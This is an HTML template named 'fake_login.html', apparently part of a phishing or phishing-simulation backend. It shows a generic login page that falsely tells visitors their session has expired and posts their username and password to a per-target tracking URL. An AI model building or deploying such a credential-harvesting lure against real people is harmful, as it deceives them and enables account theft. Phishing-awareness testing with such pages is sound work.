<!-- backend/templates/fake_login.html -->
<!doctype html>
<html lang="en">
  <head>
    <meta charset="utf-8">
    <title>Secure Login</title>
    <style>
      body { font-family: Arial, sans-serif; background-color: #f2f2f2; }
      .container { width: 300px; margin: 100px auto; padding: 20px; background: white; border-radius: 8px; box-shadow: 0px 0px 10px #ccc; }
      h2 { text-align: center; }
      input { width: 100%; padding: 8px; margin: 5px 0; box-sizing: border-box; }
      button { width: 100%; padding: 10px; background-color: #4CAF50; color: white; border: none; border-radius: 4px; cursor: pointer; }
    </style>
  </head>
  <body>
    <div class="container">
      <h2>Account Verification</h2>
      <p>Your session has expired. Please log in again.</p>
      <form method="POST" action="/submit/{{ tracking_token }}">
        <input type="text" name="username" placeholder="Username" required>
        <input type="password" name="password" placeholder="Password" required>
        <button type="submit">Log In</button>
      </form>
    </div>
  </body>
</html>
